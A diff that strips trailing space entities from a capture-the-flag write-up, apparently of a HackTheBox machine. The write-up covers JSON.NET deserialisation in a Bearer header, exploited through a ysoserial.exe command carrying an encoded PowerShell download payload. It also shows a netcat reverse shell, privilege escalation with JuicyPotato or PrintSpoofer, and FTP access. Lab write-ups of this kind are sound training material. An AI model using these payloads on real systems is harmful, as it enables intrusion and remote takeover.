@@ -60,7 +60,7 @@ The POST request to `/api/token` was my first login attempt:
 
 <figure><img src="../../../.gitbook/assets/image (3420).png" alt=""><figcaption></figcaption></figure>
 
-I noticed that in the requests proxied, there wasn't any request to `/`. When I visit it, the dashboard loads for a brief second before redirecting me to the login page. Weird. Anyways we can take a look at some of these JS files since we don't have any credentials yet.&#x20;
+I noticed that in the requests proxied, there wasn't any request to `/`. When I visit it, the dashboard loads for a brief second before redirecting me to the login page. Weird. Anyways we can take a look at some of these JS files since we don't have any credentials yet.
 
 One of them was particularly interesting:
 
@@ -128,7 +128,7 @@ The dashboard was static, so there wasn't much to do here.
 
 ### Deseralisation -> RCE
 
-As per the deobfuscated JS code, there's an `/api/Account` endpoint within the site. When I logged in the normal way above, I saw one request sent to there.&#x20;
+As per the deobfuscated JS code, there's an `/api/Account` endpoint within the site. When I logged in the normal way above, I saw one request sent to there.
 
 <figure><img src="../../../.gitbook/assets/image (3222).png" alt=""><figcaption></figcaption></figure>
 
@@ -140,11 +140,11 @@ If we remove more characters, we get this error:
 
 <figure><img src="../../../.gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure>
 
-There definitely is an insecure deserialisation exploit here, because the values of the `Bearer` header are likely unsanitised since it still attempts to process it. As such, we can use `ysoserial.exe` to generate a payload to give us a reverse shell.&#x20;
+There definitely is an insecure deserialisation exploit here, because the values of the `Bearer` header are likely unsanitised since it still attempts to process it. As such, we can use `ysoserial.exe` to generate a payload to give us a reverse shell.
 
 {% embed url="https://github.com/pwntester/ysoserial.net" %}
 
-`ysoserial.exe` has a lot of different gadgets, of which we should be using those that have the `Json.Net` formatters since we were being returned JSON in the request. This also matches the website, since it is hosted using ASP.NET. We can try to get a reverse shell using `smbserver.py` to execute `nc64.exe`.&#x20;
+`ysoserial.exe` has a lot of different gadgets, of which we should be using those that have the `Json.Net` formatters since we were being returned JSON in the request. This also matches the website, since it is hosted using ASP.NET. We can try to get a reverse shell using `smbserver.py` to execute `nc64.exe`.
 
 I tried using this gadget, but it didn't work:
 
@@ -165,7 +165,7 @@ SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4A
 ```
 {% endcode %}
 
-Afterwards, we can pass this into `ysoserial.exe`.&#x20;
+Afterwards, we can pass this into `ysoserial.exe`.
 
 {% code overflow="wrap" %}
 ```
@@ -173,7 +173,7 @@ ysoserial.exe -g ObjectDataProvider -f json.net -c "powershell -EncodedCommand S
 ```
 {% endcode %}
 
-Then, we can send the encoded payload as the value of the `Bearer` header.&#x20;
+Then, we can send the encoded payload as the value of the `Bearer` header.
 
 <figure><img src="../../../.gitbook/assets/image (1362).png" alt=""><figcaption></figcaption></figure>
 
@@ -205,11 +205,11 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
 
-We can either abuse `JuicyPotato.exe` or just use `PrintSpoofer.exe`. Both work. Before doing those, make sure to download `nc.exe` to get a `cmd.exe` shell instead of a Powershell one.&#x20;
+We can either abuse `JuicyPotato.exe` or just use `PrintSpoofer.exe`. Both work. Before doing those, make sure to download `nc.exe` to get a `cmd.exe` shell instead of a Powershell one.
 
 <figure><img src="../../../.gitbook/assets/image (1198).png" alt=""><figcaption></figcaption></figure>
 
-We can find the `root.txt` flag in the `superadmin` user's desktop.&#x20;
+We can find the `root.txt` flag in the `superadmin` user's desktop.
 
 ### Method 2: FTP
 
@@ -328,7 +328,7 @@ superadmin
 funnyhtb
 ```
 
-With this, we can try to access the FTP server again.&#x20;
+With this, we can try to access the FTP server again.
 
 ```
 $ ftp 10.129.159.228
@@ -385,4 +385,4 @@ ftp> ls
 -r--r--r-- 1 ftp ftp             34 Jun 30 01:03 root.txt
 ```
 
-We now have access to the entire file system via FTP and can download the flag via this method.&#x20;
+We now have access to the entire file system via FTP and can download the flag via this method.
